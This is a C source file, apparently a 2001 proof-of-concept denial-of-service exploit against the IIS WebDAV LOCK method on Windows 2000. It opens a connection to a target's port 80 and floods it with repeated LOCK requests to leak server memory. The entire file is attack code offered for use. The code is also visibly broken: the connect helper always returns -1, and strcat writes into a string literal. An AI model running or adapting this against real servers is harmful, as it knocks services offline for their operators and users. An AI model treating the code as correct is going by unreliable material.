/*
 * IIS WebDav Lock Method Memory Leak DoS exploit for LiNUX
 * Tahum - Tahum@acmemail.net - 20/5/2001
 *
 * This code is the proof of concept of the advisory at Bugtraq of Peter
 * Grundl (Oh... again!).
 *
 * - Affected Systems: All the httpext.dll versions prior to 0.9.3940.21 in
 *                     Windows 2000.
 *
 * Acknowledgements to PaCoRRo, AciD-KrS, [CrAsH]], mousetrap, Overdrive...
 *
 * ...and all my friends.
 *
 * (C) 2001, HeliSec.
 *
 */


 #include <netdb.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <unistd.h>
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <errno.h>


 int o_target (char *host,int port)
 {
   int sockah;
   struct sockaddr_in addr;
   struct hostent *he;

   if ((he=gethostbyname(host))==NULL)
   {
     fprintf(stderr, " ** Error , target doesn't exist.\n");
     return(-1);
   }

   if((sockah=socket(AF_INET, SOCK_STREAM, 6)) < 0)
   {
     fprintf(stderr, " ** Error making the socket.\n");
     return(-1);
   }

   memcpy(&addr.sin_addr, he->h_addr, he->h_length);
   addr.sin_family=AF_INET;
   addr.sin_port=htons(port);

   if(connect(sockah,(struct sockaddr *)&addr, sizeof(addr))==-1)
   {
     fprintf(stderr, " ** Error in the connection.\n");
     return(-1);
   }
   sockah=-1;

   return sockah;
 }


 main(int argc, char **argv)
 {
   int sockah, i;
   char *request="LOCK http://";
   strcat(request,argv[1]);
   strcat(request,"/tahum_lives.htw");

   if (argc<2) {
     fprintf(stderr, "\n ** IIS WebDav Lock Method Memory Leak DoS exploit for LiNUX **");
     fprintf(stderr, "\n By Tahum - Tahum@acmemail.net - 20/5/2001");
     fprintf(stderr, "\n (C) 2001, HeliSec.");
     fprintf(stderr, "\n Usage: %s host\n", argv[0]);
     return(-1);
   }

   fprintf(stderr, "\n ** IIS WebDav Lock Method Memory Leak DoS exploit for LiNUX **");
   fprintf(stderr, "\n By Tahum - Tahum@acmemail.net - 20/5/2001");
   fprintf(stderr, "\n Trying connect to %s...", argv[1]);

   if((sockah=o_target(argv[1],80))==-1) {
     printf(" ** Error: we can't connect.\n");
     return(-1);
   }


   fprintf(stderr, " [Connected]\n");
   fprintf(stderr, " Making the DoS...\n");

   for(i=0;i<537;i++) send(sockah, request, strlen(request), 0);

   fprintf(stderr, " All done... DoS complete.\n");
   close(sockah);
 }